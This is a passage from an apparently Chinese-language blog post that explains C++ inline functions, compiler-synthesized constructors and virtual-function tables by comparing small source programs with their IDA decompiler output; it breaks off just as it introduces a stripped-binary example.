<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setA</span><span class="params">(<span class="keyword">int</span> _a)</span></span>; <span class="comment">// 普通函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setB</span><span class="params">(<span class="keyword">int</span> _b)</span></span>&#123;b = _b;&#125; <span class="comment">// 隐式的内联函数</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">setC</span><span class="params">(<span class="keyword">int</span> _c)</span></span>; <span class="comment">// 显式的内联函数</span></span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 IDA 中分析或者在 GDB 中调试，都发现函数没有内联成功（还是当成普通文件来调用），可能是编译器的原因</li>
</ul>
<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>以下几种情况下，会合成有用的构造函数：</p>
<ul>
<li>带有默认构造函数的成员对象（例如：string 类）</li>
<li>一个派生类的父类带有构造函数（或者父类的成员对象带有默认构造函数），那么子类：<ul>
<li>如果没有定义构造函数，则会合成默认构造函数</li>
<li>如果有构造函数，但是没有调用父类的构造函数，则编译器会插入一些代码调用父类的默认构造函数</li>
</ul>
</li>
<li>带有一个虚函数的类<ul>
<li>类声明（或继承）一个虚函数</li>
<li>类派生自一个继承串链，其中有一个或更多的虚基类</li>
</ul>
</li>
</ul>
<p>案例一：带有默认构造函数的成员对象</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span>  </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string name;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test t;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>IDA 分析：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test t; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  Test::<span class="built_in">Test</span>(&amp;t);</span><br><span class="line">  Test::~<span class="built_in">Test</span>(&amp;t);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 Test 类中的 string 类带有默认构造函数，因此 Test 类会合成一个构造函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">Test::Test</span><span class="params">(Test *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>案例二：没有定义构造函数，则会合成默认构造函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span>  </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test1</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> :</span> <span class="keyword">public</span> Test1&#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Test1::<span class="built_in">Test1</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Test1&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Test2 t;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>IDA 分析：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test2 t; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  Test2::<span class="built_in">Test2</span>(&amp;t);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 Test2 没有构造函数，但父类 Test1 有构造函数，因此在 Test2 的构造函数中会调用 Test1 的构造函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">Test2::Test2</span><span class="params">(Test2 *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test1::<span class="built_in">Test1</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>案例三：如果有构造函数，但是没有调用父类的构造函数，则编译器会插入一些代码调用父类的默认构造函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span>  </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test1</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> :</span> <span class="keyword">public</span> Test1&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test2</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Test1::<span class="built_in">Test1</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Test1&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Test2::<span class="built_in">Test2</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Test2&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Test2 t;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>IDA 分析：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test2 t; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  Test2::<span class="built_in">Test2</span>(&amp;t);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于在 Test2 的构造函数中没有调用父类 Test1 的构造函数，因此编译器会自动加上 Test2 的构造函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">Test2::Test2</span><span class="params">(Test2 *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  Test1::<span class="built_in">Test1</span>(<span class="keyword">this</span>);</span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Test2&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>案例四：带有一个虚函数的类</p>
<ul>
<li>源代码：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Test::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    Test *t = <span class="keyword">new</span> <span class="built_in">Test</span>();</span><br><span class="line">    t-&gt;<span class="built_in">foo</span>();   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>IDA 分析：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test *v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = (Test *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v3-&gt;_vptr_Test = <span class="number">0LL</span>;</span><br><span class="line">  Test::<span class="built_in">Test</span>(v3);</span><br><span class="line">  (*v3-&gt;_vptr_Test)(v3, argv);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 Test 中有虚函数，因此编译器会自动为其生成构造函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">Test::Test</span><span class="params">(Test *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">this</span>-&gt;_vptr_Test = (<span class="built_in"><span class="keyword">int</span></span> (**)(...))&amp;off_3D70;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>面向对象的语言有三大特性：继承、封装、多态，虚函数就是 cpp 实现多态的方式</p>
<ul>
<li>多态：指用相同的接口去表示不同的实现</li>
</ul>
<p>案例一：使用虚函数实现多态</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span><span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;A::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;B::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span><span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;C::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    Base *a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo</span>(); <span class="comment">// B::foo() is called</span></span><br><span class="line">    ((A *)a)-&gt;<span class="built_in">foo</span>(); <span class="comment">// B::foo() is called</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当使用类的指针调用成员函数时：<ul>
<li>普通函数由指针类型决定</li>
<li>虚函数由指针指向的实际类型决定</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  B *v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = (B *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v3-&gt;_vptr_Base = <span class="number">0LL</span>;</span><br><span class="line">  B::<span class="built_in">B</span>(v3);</span><br><span class="line">  (*v3-&gt;_vptr_Base)(v3, argv);</span><br><span class="line">  (*v3-&gt;_vptr_Base)(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 <code>_vptr_Base</code> 就是虚指针基址，它将会在对应的构造函数中进行初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">B::B</span><span class="params">(B *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Base::Base(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>-&gt;_vptr_Base = (<span class="keyword">int</span> (**)(...))&amp;off_3D40;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D40 <span class="number">8</span>C <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3D40 dq offset _ZN1B3fooEv          ; DATA XREF: B::B(<span class="keyword">void</span>)+<span class="number">18</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D40                                                                       ; B::foo(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<p>对于拥有虚函数的类，其每个对象均具有一个指向本类虚函数表的指针 <code>_vptr_Base</code>（可以将其理解为虚函数的函数指针）</p>
<p>案例二：虚函数的调用与虚表</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo1() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo2() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo3() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo4</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo4() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo5</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo5() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    Base *a = <span class="keyword">new</span> <span class="built_in">Base</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo1</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo2</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo3</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo4</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo5</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>cpp 底层处理虚表的方式就是强转并调用 <code>_vptr_Base + offset</code>：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Base *v3; <span class="comment">// rbx</span></span><br><span class="line">  Base *a; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (Base *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v3-&gt;_vptr_Base = <span class="number">0LL</span>;</span><br><span class="line">  Base::<span class="built_in">Base</span>(v3);</span><br><span class="line">  a = v3;</span><br><span class="line">  (*v3-&gt;_vptr_Base)(v3, argv);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(Base *))a-&gt;_vptr_Base + <span class="number">1</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(Base *))a-&gt;_vptr_Base + <span class="number">2</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(Base *))a-&gt;_vptr_Base + <span class="number">3</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(Base *))a-&gt;_vptr_Base + <span class="number">4</span>))(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>再看一个去符号的：</li>
</ul>
